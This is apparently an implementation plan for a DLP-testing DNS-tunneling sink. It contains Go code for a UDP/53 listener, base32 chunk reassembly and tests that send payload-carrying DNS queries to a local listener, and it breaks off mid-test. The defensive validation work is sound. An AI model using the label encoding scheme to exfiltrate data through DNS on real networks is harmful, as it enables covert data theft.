# DNS Tunneling Exfiltration Channel Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Add a protocol-distinct DNS-tunneling exfiltration channel — a purpose-built UDP/53 listener that reassembles a base32-encoded synthetic sensitive record from a sequence of DNS query labels and resolves a sink-primary DLP verdict from whether reassembly ever completes.

**Architecture:** A new `internal/dnssink` package owns a UDP/53 listener (via `github.com/miekg/dns` for wire parsing only, never as a recursive resolver), kept structurally separate from the existing HTTP sink in `internal/api`. It reuses the existing `dlp_sink_tokens`/`dlp_sink_receipts` schema and writes into the same receipts table on successful reassembly — meaning `internal/verifysync` and `internal/reporting`'s verification path need zero code changes, since they already key purely on "does a receipt exist for this token."

**Tech Stack:** Go, `github.com/miekg/dns` (new dependency), PostgreSQL (existing `dlp_sink_tokens`/`dlp_sink_receipts` tables, unchanged), PowerShell (agent-side `nslookup`).

**Spec:** `orchestrator/docs/superpowers/specs/2026-08-19-dns-tunneling-exfiltration-channel-design.md`

## Global Constraints

- Bind UDP `:53` directly (via `cap_add: NET_BIND_SERVICE` in `docker-compose.yml`) — never silently fall back to a non-standard port; a bind failure must be logged loudly and reflected in the listener's own `Status()`.
- Use `github.com/miekg/dns` for all DNS wire parsing/serialization; scope stays narrow — message unpack/pack only, never a recursive resolver or general DNS server.
- New package `internal/dnssink`, architecturally separate from `internal/api`'s existing HTTP sink (`internal/api/dlp_sink.go`) — no import cycle either direction beyond `internal/api` importing `internal/dnssink` for the `DomainSuffix` constant.
- Reuse the existing `dlp_sink_tokens`/`dlp_sink_receipts` tables unchanged — no new tables, no schema migration.
- `generateSinkToken` (`internal/api/dlp_sink.go`) changes from zero-arg to `generateSinkToken(n int)` — 32 bytes for the existing HTTP channel (unchanged behavior), 8 bytes for the new DNS campaign ID.
- Full reassembly is required for a `Succeeded` verdict; anything less (nothing received, or an incomplete set that never completes before the reassembly timeout) resolves `Blocked` — no new "partial" outcome state.
- Every valid query gets a `NOERROR` response with a fixed, harmless A record (`192.0.2.1`, RFC 5737 TEST-NET-1) — never `NXDOMAIN`.
- Security hardening ships in V1, not as a follow-up: max UDP packet size, max QNAME/label length (delegated to `miekg/dns`'s own `Unpack`, re-validated), only `A`-type queries treated as tunneling records, a per-campaign declared-chunk-count ceiling, a reassembly timeout reusing the existing 10-minute `sinkTokenTTL`, and a coarse per-source-IP rate limit. QNAMEs and chunk data are never logged in full.
- Zero code changes to `internal/verifysync` or `internal/reporting` — proven via regression tests, not silently assumed.
- No frontend/`wwwroot` changes.

**Note on one spec simplification:** the spec describes the header record's declared-total-chunk-count field as base32-encoded. This plan uses a plain decimal string instead (e.g. `"4"`) — DNS labels permit arbitrary printable-ASCII content, so encoding a tiny integer through the base32 round-trip adds implementation complexity (byte-packing a count, decoding it back) for no benefit over a decimal string in the same label position. This is a deliberate, documented simplification of the wire format, not a change to any behavior the spec locks in (the header record still declares the total chunk count in the same query shape as data chunks; only its literal encoding differs).

---

## Task 1: Generalize `generateSinkToken` to accept a byte-length parameter

**Files:**
- Modify: `orchestrator/internal/api/dlp_sink.go`
- Modify: `orchestrator/internal/api/dlp_sink_test.go`

**Interfaces:**
- Consumes: nothing new.
- Produces: `func generateSinkToken(n int) (string, error)` — consumed by this task's own call site (unchanged behavior at `n=32`) and by Task 6's new `n=8` call site.

- [ ] **Step 1: Update the existing test to call the new signature and add a length-specific test**

Replace the existing `TestGenerateSinkToken_ProducesUniqueUnpredictableValues` in `orchestrator/internal/api/dlp_sink_test.go` and add a new test immediately after it:

```go
func TestGenerateSinkToken_ProducesUniqueUnpredictableValues(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 100; i++ {
		tok, err := generateSinkToken(32)
		if err != nil {
			t.Fatalf("generateSinkToken(32): %v", err)
		}
		if len(tok) != 64 { // 32 bytes hex-encoded = 64 chars
			t.Fatalf("token %q wrong length for 32-byte input: got %d chars, want 64", tok, len(tok))
		}
		if seen[tok] {
			t.Fatalf("generateSinkToken produced a duplicate: %q", tok)
		}
		seen[tok] = true
	}
}

func TestGenerateSinkToken_ShorterLengthForDNSLabelSafety(t *testing.T) {
	tok, err := generateSinkToken(8)
	if err != nil {
		t.Fatalf("generateSinkToken(8): %v", err)
	}
	if len(tok) != 16 { // 8 bytes hex-encoded = 16 chars
		t.Fatalf("token %q wrong length for 8-byte input: got %d chars, want 16", tok, len(tok))
	}
	if len(tok) > 63 {
		t.Fatalf("token %q exceeds the 63-character DNS label limit", tok)
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/api/... -run "TestGenerateSinkToken" -v`
Expected: FAIL to compile — `generateSinkToken(32)`/`generateSinkToken(8)` don't match the current zero-arg signature.

- [ ] **Step 3: Update `generateSinkToken` and its one call site**

In `orchestrator/internal/api/dlp_sink.go`, replace the existing `generateSinkToken` function:

```go
// generateSinkToken returns an n-byte crypto/rand value, hex-encoded (2n hex
// characters). Callers choose n based on how the token will be used: 32
// bytes for the HTTP sink's {{SINK_TOKEN}} (no length constraint on an HTTP
// request body), 8 bytes for the DNS channel's {{SINK_DNS_CAMPAIGN_ID}}
// (must fit inside a single 63-character DNS label alongside a sequence
// number and other structure). Unlike newID() (handlers.go), which derives
// from time.Now().UnixNano() and is therefore guessable within a narrow
// window, this token is the actual anti-replay credential a step must
// present back to prove its payload reached the destination -- it must
// not be predictable regardless of length.
func generateSinkToken(n int) (string, error) {
	buf := make([]byte, n)
	if _, err := rand.Read(buf); err != nil {
		return "", fmt.Errorf("generate sink token: %w", err)
	}
	return hex.EncodeToString(buf), nil
}
```

And update its one call site inside `issueSinkTokensAndSubstitute`:

```go
		token, err := generateSinkToken(32)
```

(replacing the current `token, err := generateSinkToken()`).

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/api/... -run "TestGenerateSinkToken" -v`
Expected: PASS.

- [ ] **Step 5: Run the full `internal/api` test suite**

Run in background (8-17 minutes observed in prior sessions):

```bash
cd orchestrator && go test ./internal/api/... -v -timeout 20m > <scratchpad>/dns_task1_full.log 2>&1
```

Use `Monitor` to watch for the `ok`/`FAIL` line (grep the log for `^(ok|FAIL)[[:space:]]+github.com/audspect/bas/internal/api`), then read the actual full log file after the notification and confirm zero `--- FAIL` lines.

- [ ] **Step 6: Commit**

```bash
git add orchestrator/internal/api/dlp_sink.go orchestrator/internal/api/dlp_sink_test.go
git commit -m "$(cat <<'EOF'
refactor(api): generalize generateSinkToken to a byte-length parameter

Groundwork for the DNS tunneling channel: its campaign ID needs to fit
inside a single 63-character DNS label, so it needs a shorter token than
the existing 32-byte HTTP sink token. Same crypto/rand source, same
anti-replay guarantee, just parameterized length -- existing HTTP call
site is unchanged behavior at n=32.
EOF
)"
git push
```

---

## Task 2: `internal/dnssink` — wire parsing, validation, and response building

**Files:**
- Create: `orchestrator/internal/dnssink/protocol.go`
- Create: `orchestrator/internal/dnssink/protocol_test.go`

**Interfaces:**
- Consumes: `github.com/miekg/dns` (new dependency, added this task).
- Produces: `const DomainSuffix = "dnssink.audspect.local"`; `type record struct { Seq int; Payload string; Campaign string }`; `func extractRecord(msg *dns.Msg, domainSuffix string) (rec record, ok bool)`; `func tooLarge(raw []byte) bool`; `func buildResponse(query *dns.Msg) *dns.Msg`; `type rateLimiter struct{...}`, `func newRateLimiter(limit int, window time.Duration) *rateLimiter`, `func (rl *rateLimiter) allow(sourceIP string) bool` — all consumed by Task 4's listener.

- [ ] **Step 1: Add the new dependency**

```bash
cd orchestrator && go get github.com/miekg/dns
```

This updates `go.mod`/`go.sum`. Confirm with `grep miekg orchestrator/go.mod`.

- [ ] **Step 2: Write the failing tests**

Create `orchestrator/internal/dnssink/protocol_test.go`:

```go
package dnssink

import (
	"net"
	"testing"
	"time"

	"github.com/miekg/dns"
)

func aQuery(name string) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(name), dns.TypeA)
	return m
}

func TestTooLarge(t *testing.T) {
	small := make([]byte, maxPacketBytes)
	if tooLarge(small) {
		t.Error("packet at exactly the limit should not be rejected")
	}
	big := make([]byte, maxPacketBytes+1)
	if !tooLarge(big) {
		t.Error("packet one byte over the limit should be rejected")
	}
}

func TestExtractRecord_HeaderRecord(t *testing.T) {
	rec, ok := extractRecord(aQuery("000.4.abcd1234ef567890.dnssink.audspect.local"), "dnssink.audspect.local")
	if !ok {
		t.Fatal("expected a valid header record")
	}
	if rec.Seq != 0 {
		t.Errorf("Seq = %d, want 0", rec.Seq)
	}
	if rec.Payload != "4" {
		t.Errorf("Payload = %q, want %q", rec.Payload, "4")
	}
	if rec.Campaign != "abcd1234ef567890" {
		t.Errorf("Campaign = %q, want %q", rec.Campaign, "abcd1234ef567890")
	}
}

func TestExtractRecord_DataChunk(t *testing.T) {
	rec, ok := extractRecord(aQuery("001.MFXHI2DJNZSQ.abcd1234ef567890.dnssink.audspect.local"), "dnssink.audspect.local")
	if !ok {
		t.Fatal("expected a valid data chunk record")
	}
	if rec.Seq != 1 {
		t.Errorf("Seq = %d, want 1", rec.Seq)
	}
	if rec.Payload != "MFXHI2DJNZSQ" {
		t.Errorf("Payload = %q, want %q", rec.Payload, "MFXHI2DJNZSQ")
	}
}

func TestExtractRecord_WrongDomainSuffixRejected(t *testing.T) {
	_, ok := extractRecord(aQuery("001.MFXHI2DJNZSQ.abcd1234ef567890.evil.example"), "dnssink.audspect.local")
	if ok {
		t.Error("a query for a different domain suffix must not be treated as a tunneling record")
	}
}

func TestExtractRecord_NonAQueryRejected(t *testing.T) {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn("001.MFXHI2DJNZSQ.abcd1234ef567890.dnssink.audspect.local"), dns.TypeAAAA)
	_, ok := extractRecord(m, "dnssink.audspect.local")
	if ok {
		t.Error("a non-A query must not be treated as a tunneling record")
	}
}

func TestExtractRecord_TooFewLabelsRejected(t *testing.T) {
	_, ok := extractRecord(aQuery("001.MFXHI2DJNZSQ.local"), "dnssink.audspect.local")
	if ok {
		t.Error("a query without enough labels for seq.chunk.campaign must be rejected")
	}
}

func TestExtractRecord_NonNumericSeqRejected(t *testing.T) {
	_, ok := extractRecord(aQuery("abc.MFXHI2DJNZSQ.abcd1234ef567890.dnssink.audspect.local"), "dnssink.audspect.local")
	if ok {
		t.Error("a non-numeric seq label must be rejected")
	}
}

func TestBuildResponse_NOERRORWithFixedARecord(t *testing.T) {
	query := aQuery("001.MFXHI2DJNZSQ.abcd1234ef567890.dnssink.audspect.local")
	resp := buildResponse(query)
	if resp.Rcode != dns.RcodeSuccess {
		t.Errorf("Rcode = %v, want NOERROR", resp.Rcode)
	}
	if resp.Id != query.Id {
		t.Errorf("Id = %d, want %d (must echo the query's transaction ID)", resp.Id, query.Id)
	}
	if len(resp.Answer) != 1 {
		t.Fatalf("Answer records = %d, want 1", len(resp.Answer))
	}
	a, ok := resp.Answer[0].(*dns.A)
	if !ok {
		t.Fatalf("Answer[0] is not an A record: %T", resp.Answer[0])
	}
	if !a.A.Equal(net.ParseIP(fixedResponseIP)) {
		t.Errorf("A = %v, want %v", a.A, fixedResponseIP)
	}
}

func TestBuildResponse_NonAQueryStillNOERRORNoAnswer(t *testing.T) {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn("whatever.example"), dns.TypeTXT)
	resp := buildResponse(m)
	if resp.Rcode != dns.RcodeSuccess {
		t.Errorf("Rcode = %v, want NOERROR", resp.Rcode)
	}
	if len(resp.Answer) != 0 {
		t.Errorf("Answer records = %d, want 0 for a non-A query", len(resp.Answer))
	}
}

func TestRateLimiter_AllowsUpToLimitThenBlocks(t *testing.T) {
	rl := newRateLimiter(3, time.Minute)
	for i := 0; i < 3; i++ {
		if !rl.allow("10.0.0.1") {
			t.Fatalf("request %d should be allowed within the limit", i+1)
		}
	}
	if rl.allow("10.0.0.1") {
		t.Error("request beyond the limit should be blocked")
	}
}

func TestRateLimiter_TracksSourcesIndependently(t *testing.T) {
	rl := newRateLimiter(1, time.Minute)
	if !rl.allow("10.0.0.1") {
		t.Fatal("first request from 10.0.0.1 should be allowed")
	}
	if !rl.allow("10.0.0.2") {
		t.Error("a different source IP must have its own independent limit")
	}
}
```

- [ ] **Step 3: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/dnssink/... -v`
Expected: FAIL to compile — package `dnssink` doesn't exist yet.

- [ ] **Step 4: Implement `protocol.go`**

Create `orchestrator/internal/dnssink/protocol.go`:

```go
// Package dnssink implements a purpose-built DNS-tunneling exfiltration
// sink for the DLP validation suite -- a minimal UDP/53 listener that
// reassembles a base32-encoded payload from a sequence of DNS query
// labels, never a recursive resolver or general-purpose DNS server. See
// docs/superpowers/specs/2026-08-19-dns-tunneling-exfiltration-channel-design.md.
package dnssink

import (
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"
)

// DomainSuffix is the fixed label suffix a scenario's DNS-tunneling step
// targets (e.g. "000.4.<campaign-id>.dnssink.audspect.local"). It is a
// naming convention only, never a delegated DNS zone -- queries target
// {{SINK_DNS_SERVER}} (the orchestrator's own IP) directly and never go
// through recursive resolution.
const DomainSuffix = "dnssink.audspect.local"

// fixedResponseIP is returned in every A-record response this listener
// ever sends, regardless of whether the query was a recognized tunneling
// record. RFC 5737 TEST-NET-1 -- documentation-only, never routable.
const fixedResponseIP = "192.0.2.1"

// maxPacketBytes bounds the raw UDP payload size this listener will parse.
// A generous ceiling for legitimate DNS-over-UDP traffic; anything larger
// is dropped without being unpacked.
const maxPacketBytes = 512

// record is what this listener cares about from an incoming tunneling
// query -- deliberately narrow, not a general DNS message wrapper.
// Seq == 0 marks a header record, whose Payload is the declared total
// chunk count as a decimal string (not base32 -- see the plan's note on
// this simplification). Seq >= 1 marks a data chunk, whose Payload is the
// base32-encoded chunk text.
type record struct {
	Seq      int
	Payload  string
	Campaign string
}

// tooLarge reports whether raw exceeds this listener's maximum accepted
// UDP packet size. Checked before attempting to unpack -- oversized
// packets are dropped without ever being parsed.
func tooLarge(raw []byte) bool {
	return len(raw) > maxPacketBytes
}

// extractRecord validates msg against this listener's shape requirements
// and, if it matches, extracts its seq/payload/campaign components. ok is
// false for every rejection reason uniformly (wrong query type, too few
// labels, non-numeric seq, wrong domain suffix) -- callers always respond
// with the same fixed NOERROR record regardless of why a query didn't
// parse as a tunneling record.
func extractRecord(msg *dns.Msg, domainSuffix string) (rec record, ok bool) {
	if len(msg.Question) != 1 || msg.Question[0].Qtype != dns.TypeA {
		return record{}, false
	}
	name := strings.TrimSuffix(msg.Question[0].Name, ".")
	labels := strings.Split(name, ".")
	if len(labels) < 4 {
		return record{}, false
	}
	seq, err := strconv.Atoi(labels[0])
	if err != nil || seq < 0 || seq > 999 {
		return record{}, false
	}
	suffix := strings.Join(labels[3:], ".")
	if !strings.EqualFold(suffix, domainSuffix) {
		return record{}, false
	}
	return record{Seq: seq, Payload: labels[1], Campaign: labels[2]}, true
}

// buildResponse always returns a NOERROR response echoing the query's
// transaction ID and question section. An A-type query gets a single
// fixed A answer (fixedResponseIP); any other query type gets NOERROR
// with no answer section. Never NXDOMAIN -- see the design spec's
// rationale (a clean, consistent response lets every query in an
// nslookup-driven sequence complete without triggering retries or
// error-looking script output).
func buildResponse(query *dns.Msg) *dns.Msg {
	resp := new(dns.Msg)
	resp.SetReply(query)
	resp.Authoritative = true
	if len(query.Question) == 1 && query.Question[0].Qtype == dns.TypeA {
		resp.Answer = append(resp.Answer, &dns.A{
			Hdr: dns.RR_Header{Name: query.Question[0].Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 60},
			A:   net.ParseIP(fixedResponseIP),
		})
	}
	return resp
}

// rateLimiter is a coarse, fixed-window per-source-IP abuse guard -- not a
// precision rate limiter, adequate for a low-throughput purpose-built
// listener that only ever expects traffic from BAS agents running a
// scenario step.
type rateLimiter struct {
	mu     sync.Mutex
	limit  int
	window time.Duration
	counts map[string]*windowCount
}

type windowCount struct {
	count      int
	windowEnds time.Time
}

func newRateLimiter(limit int, window time.Duration) *rateLimiter {
	return &rateLimiter{limit: limit, window: window, counts: map[string]*windowCount{}}
}

// allow reports whether sourceIP may send another packet in the current
// window, incrementing its count as a side effect.
func (rl *rateLimiter) allow(sourceIP string) bool {
	rl.mu.Lock()
	defer rl.mu.Unlock()
	now := time.Now()
	wc, ok := rl.counts[sourceIP]
	if !ok || now.After(wc.windowEnds) {
		rl.counts[sourceIP] = &windowCount{count: 1, windowEnds: now.Add(rl.window)}
		return true
	}
	wc.count++
	return wc.count <= rl.limit
}
```

- [ ] **Step 5: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/dnssink/... -v`
Expected: PASS.

- [ ] **Step 6: Commit**

```bash
git add orchestrator/go.mod orchestrator/go.sum orchestrator/internal/dnssink/protocol.go orchestrator/internal/dnssink/protocol_test.go
git commit -m "$(cat <<'EOF'
feat(dnssink): DNS wire parsing, validation, and fixed response building

New internal/dnssink package, kept structurally separate from the
existing HTTP sink (internal/api/dlp_sink.go). Uses github.com/miekg/dns
strictly for message unpack/pack -- this listener accepts binary,
agent-influenced input on an open UDP port, and a mature, widely-used
library is safer here than a hand-rolled wire-format parser. Every valid
query gets a fixed NOERROR+A-record response (never NXDOMAIN) so an
nslookup-driven sequence completes cleanly without retries.
EOF
)"
git push
```

---

## Task 3: `internal/dnssink` — chunk reassembly

**Files:**
- Create: `orchestrator/internal/dnssink/reassembler.go`
- Create: `orchestrator/internal/dnssink/reassembler_test.go`

**Interfaces:**
- Consumes: nothing from Task 2 directly (pure in-memory state, decoupled from wire parsing).
- Produces: `func newReassembler(ttl time.Duration, maxChunks int) *reassembler`; `func (r *reassembler) header(campaignID, totalStr string) error`; `func (r *reassembler) chunk(campaignID string, seq int, b32Chunk string) (decoded []byte, complete bool, err error)`; `func (r *reassembler) evictExpired()` — all consumed by Task 4's listener.

- [ ] **Step 1: Write the failing tests**

Create `orchestrator/internal/dnssink/reassembler_test.go`:

```go
package dnssink

import (
	"encoding/base32"
	"testing"
	"time"
)

func b32(s string) string {
	return base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(s))
}

func TestReassembler_HeaderThenChunksCompletesAndDecodes(t *testing.T) {
	r := newReassembler(10*time.Minute, 64)
	if err := r.header("campaign1", "2"); err != nil {
		t.Fatalf("header: %v", err)
	}
	full := "hello world"
	half := len(full) / 2
	c1 := b32(full[:half])
	c2 := b32(full[half:])

	decoded, complete, err := r.chunk("campaign1", 1, c1)
	if err != nil {
		t.Fatalf("chunk 1: %v", err)
	}
	if complete {
		t.Fatal("should not be complete after only 1 of 2 chunks")
	}
	if decoded != nil {
		t.Error("decoded should be nil until complete")
	}

	decoded, complete, err = r.chunk("campaign1", 2, c2)
	if err != nil {
		t.Fatalf("chunk 2: %v", err)
	}
	if !complete {
		t.Fatal("should be complete after all declared chunks arrive")
	}
	if string(decoded) != full {
		t.Errorf("decoded = %q, want %q", decoded, full)
	}
}

func TestReassembler_ChunkBeforeHeaderRejected(t *testing.T) {
	r := newReassembler(10*time.Minute, 64)
	_, _, err := r.chunk("unknown-campaign", 1, b32("x"))
	if err == nil {
		t.Error("a chunk for a campaign with no header yet must be rejected")
	}
}

func TestReassembler_HeaderRejectsOversizedDeclaredTotal(t *testing.T) {
	r := newReassembler(10*time.Minute, 64)
	if err := r.header("campaign1", "1000"); err == nil {
		t.Error("a header declaring more than maxChunks must be rejected")
	}
}

func TestReassembler_HeaderRejectsNonNumericTotal(t *testing.T) {
	r := newReassembler(10*time.Minute, 64)
	if err := r.header("campaign1", "not-a-number"); err == nil {
		t.Error("a non-numeric declared total must be rejected")
	}
}

func TestReassembler_ChunkSeqBeyondDeclaredTotalRejected(t *testing.T) {
	r := newReassembler(10*time.Minute, 64)
	if err := r.header("campaign1", "2"); err != nil {
		t.Fatalf("header: %v", err)
	}
	_, _, err := r.chunk("campaign1", 5, b32("x"))
	if err == nil {
		t.Error("a chunk seq beyond the declared total must be rejected")
	}
}

func TestReassembler_EvictExpiredRemovesStaleCampaigns(t *testing.T) {
	r := newReassembler(1*time.Minute, 64)
	fakeNow := time.Now()
	r.now = func() time.Time { return fakeNow }
	if err := r.header("campaign1", "2"); err != nil {
		t.Fatalf("header: %v", err)
	}
	fakeNow = fakeNow.Add(2 * time.Minute) // past the 1-minute TTL
	r.evictExpired()
	_, _, err := r.chunk("campaign1", 1, b32("x"))
	if err == nil {
		t.Error("chunk should be rejected after its campaign's TTL expired and it was evicted")
	}
}

func TestReassembler_DuplicateChunkOverwritesWithoutError(t *testing.T) {
	r := newReassembler(10*time.Minute, 64)
	if err := r.header("campaign1", "1"); err != nil {
		t.Fatalf("header: %v", err)
	}
	if _, _, err := r.chunk("campaign1", 1, b32("first")); err != nil {
		t.Fatalf("first chunk 1: %v", err)
	}
	decoded, complete, err := r.chunk("campaign1", 1, b32("second"))
	if err != nil {
		t.Fatalf("duplicate chunk 1: %v", err)
	}
	if !complete {
		t.Fatal("should be complete -- the only declared chunk was (re)received")
	}
	if string(decoded) != "second" {
		t.Errorf("decoded = %q, want %q (the later resend should win)", decoded, "second")
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `cd orchestrator && go test ./internal/dnssink/... -run TestReassembler -v`
Expected: FAIL to compile — `newReassembler`, `header`, `chunk`, `evictExpired`, `.now` undefined.

- [ ] **Step 3: Implement `reassembler.go`**

Create `orchestrator/internal/dnssink/reassembler.go`:

```go
package dnssink

import (
	"encoding/base32"
	"fmt"
	"strconv"
	"strings"
	"sync"
	"time"
)

// reassembler accumulates DNS-tunneled chunks per campaign ID, keyed by
// the campaign ID extracted from each query (see protocol.go's record
// type). Not meant to be shared across processes -- one reassembler per
// listener instance, matching this being a purpose-built, single-process
// component rather than a distributed DNS server.
type reassembler struct {
	mu        sync.Mutex
	campaigns map[string]*campaignState
	ttl       time.Duration
	maxChunks int
	now       func() time.Time
}

type campaignState struct {
	total   int // 0 until the header record is seen
	chunks  map[int]string
	expires time.Time
}

func newReassembler(ttl time.Duration, maxChunks int) *reassembler {
	return &reassembler{
		campaigns: map[string]*campaignState{},
		ttl:       ttl,
		maxChunks: maxChunks,
		now:       time.Now,
	}
}

// header records the declared total chunk count for a campaign, creating
// its state (or resetting it, if a header for the same campaign ID
// arrives again). Rejects a declared total that is non-numeric, zero,
// negative, or larger than maxChunks -- a header declaring an implausibly
// large count is refused outright rather than allocating buffer space
// for it.
func (r *reassembler) header(campaignID, totalStr string) error {
	total, err := strconv.Atoi(totalStr)
	if err != nil || total < 1 || total > r.maxChunks {
		return fmt.Errorf("invalid or oversized declared total %q (max %d)", totalStr, r.maxChunks)
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	r.campaigns[campaignID] = &campaignState{
		total:   total,
		chunks:  map[int]string{},
		expires: r.now().Add(r.ttl),
	}
	return nil
}

// chunk records one data chunk for campaignID. Returns complete=true
// exactly when this was the chunk that completed a previously-declared
// total, in which case decoded holds the fully reassembled and
// base32-decoded payload. A duplicate/resent seq overwrites the earlier
// value without erroring -- real network conditions can cause a resend,
// and the verifier only needs "was the full sequence eventually seen",
// not exactly-once delivery.
func (r *reassembler) chunk(campaignID string, seq int, b32Chunk string) (decoded []byte, complete bool, err error) {
	r.mu.Lock()
	defer r.mu.Unlock()
	cs, ok := r.campaigns[campaignID]
	if !ok || cs.total == 0 {
		return nil, false, fmt.Errorf("chunk for unknown/header-less campaign %q", campaignID)
	}
	if seq < 1 || seq > cs.total {
		return nil, false, fmt.Errorf("chunk seq %d out of range for declared total %d", seq, cs.total)
	}
	cs.chunks[seq] = b32Chunk
	cs.expires = r.now().Add(r.ttl)
	if len(cs.chunks) < cs.total {
		return nil, false, nil
	}
	var sb strings.Builder
	for i := 1; i <= cs.total; i++ {
		sb.WriteString(cs.chunks[i])
	}
	dec, err := base32.StdEncoding.WithPadding(base32.NoPadding).DecodeString(sb.String())
	if err != nil {
		return nil, false, fmt.Errorf("decode reassembled payload: %w", err)
	}
	delete(r.campaigns, campaignID)
	return dec, true, nil
}

// evictExpired removes any campaign whose TTL has passed, bounding this
// reassembler's memory use regardless of how many campaigns start and
// never complete.
func (r *reassembler) evictExpired() {
	r.mu.Lock()
	defer r.mu.Unlock()
	now := r.now()
	for id, cs := range r.campaigns {
		if now.After(cs.expires) {
			delete(r.campaigns, id)
		}
	}
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `cd orchestrator && go test ./internal/dnssink/... -run TestReassembler -v`
Expected: PASS.

- [ ] **Step 5: Run the full `internal/dnssink` package suite**

Run: `cd orchestrator && go test ./internal/dnssink/... -v`
Expected: PASS — every test from both Task 2 and Task 3.

- [ ] **Step 6: Commit**

```bash
git add orchestrator/internal/dnssink/reassembler.go orchestrator/internal/dnssink/reassembler_test.go
git commit -m "$(cat <<'EOF'
feat(dnssink): per-campaign chunk reassembly with TTL eviction

Buffers chunks in memory keyed by campaign ID, completing (and
base32-decoding) only once every chunk 1..declared-total has arrived --
anything less than the full sequence never completes, matching the
"full reassembly required for Succeeded" verdict rule. TTL-based
eviction bounds memory regardless of how many campaigns never finish.
EOF
)"
git push
```

---

## Task 4: `internal/dnssink` — UDP listener, receive loop, and receipt persistence

**Files:**
- Create: `orchestrator/internal/dnssink/listener.go`
- Create: `orchestrator/internal/dnssink/listener_test.go`

**Interfaces:**
- Consumes: `record`/`extractRecord`/`tooLarge`/`buildResponse`/`rateLimiter` (Task 2); `reassembler`/`header`/`chunk`/`evictExpired` (Task 3); `dlp_sink_receipts` table (existing, unchanged schema).
- Produces: `type Status struct { State, Reason, Bind string }`; `type Listener struct{...}`; `func NewListener(addr, domainSuffix string, db *pgxpool.Pool) (*Listener, error)`; `func (l *Listener) LocalAddr() net.Addr`; `func (l *Listener) Serve(ctx context.Context)`; `func (l *Listener) Status() Status`; `func (l *Listener) Close() error`; `func StartListener(ctx context.Context, addr, domainSuffix string, db *pgxpool.Pool) *Listener` — consumed by Task 5's `cmd/server/main.go` wiring.

- [ ] **Step 1: Write the failing tests**

Create `orchestrator/internal/dnssink/listener_test.go`:

```go
package dnssink

import (
	"context"
	"crypto/sha256"
	"encoding/base32"
	"encoding/hex"
	"flag"
	"net"
	"os"
	"testing"
	"time"

	"github.com/audspect/bas/internal/testutil"
	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/miekg/dns"
)

var sharedDB *testutil.TestDB

func TestMain(m *testing.M) {
	flag.Parse()
	if testing.Short() {
		os.Exit(m.Run())
	}
	sharedDB = testutil.MustSharedTestDB()
	code := m.Run()
	sharedDB.Cleanup()
	os.Exit(code)
}

func sendQuery(t *testing.T, conn net.Conn, name string) {
	t.Helper()
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(name), dns.TypeA)
	raw, err := m.Pack()
	if err != nil {
		t.Fatalf("pack query %q: %v", name, err)
	}
	if _, err := conn.Write(raw); err != nil {
		t.Fatalf("send query %q: %v", name, err)
	}
}

func TestNewListener_BindsEphemeralPortAndReportsRunning(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener(":0", DomainSuffix, pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		st := l.Status()
		if st.State != "running" {
			t.Errorf("State = %q, want running", st.State)
		}
		if st.Bind == "" {
			t.Error("Bind should report the actual bound address")
		}
	})
}

func TestListener_FullExchangeReassemblesAndRecordsReceipt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener(":0", DomainSuffix, pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
		ctx, cancel := context.WithCancel(context.Background())
		defer cancel()
		go l.Serve(ctx)

		client, err := net.Dial("udp", l.LocalAddr().String())
		if err != nil {
			t.Fatalf("dial listener: %v", err)
		}
		defer client.Close()

		campaignID := "feedfacecafebeef"
		payload := "integration-test-payload"
		enc := base32.StdEncoding.WithPadding(base32.NoPadding).EncodeToString([]byte(payload))
		half := len(enc) / 2

		sendQuery(t, client, "000.2."+campaignID+"."+DomainSuffix)
		sendQuery(t, client, "001."+enc[:half]+"."+campaignID+"."+DomainSuffix)
		sendQuery(t, client, "002."+enc[half:]+"."+campaignID+"."+DomainSuffix)

		var (
			payloadHash string
			payloadSize int
			channel     string
		)
		deadline := time.Now().Add(5 * time.Second)
		for {
			err := pool.QueryRow(context.Background(),
				`SELECT payload_hash, payload_size, channel FROM dlp_sink_receipts WHERE token = $1`,
				campaignID,
			).Scan(&payloadHash, &payloadSize, &channel)
			if err == nil {
				break
			}
			if time.Now().After(deadline) {
				t.Fatalf("no dlp_sink_receipts row for campaign %s within 5s: %v", campaignID, err)
			}
			time.Sleep(50 * time.Millisecond)
		}

		wantSum := sha256.Sum256([]byte(payload))
		if payloadHash != hex.EncodeToString(wantSum[:]) {
			t.Errorf("payload_hash = %q, want sha256(%q)", payloadHash, payload)
		}
		if payloadSize != len(payload) {
			t.Errorf("payload_size = %d, want %d", payloadSize, len(payload))
		}
		if channel != "dns-tunnel" {
			t.Errorf("channel = %q, want dns-tunnel", channel)
		}
	})
}

func TestListener_MalformedPacketDoesNotCrashOrRespond(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping container-backed test in -short mode")
	}
	sharedDB.RunWithPool(t, func(pool *pgxpool.Pool) {
		l, err := NewListener(":0", DomainSuffix, pool)
		if err != nil {
			t.Fatalf("NewListener: %v", err)
		}
		defer l.Close()
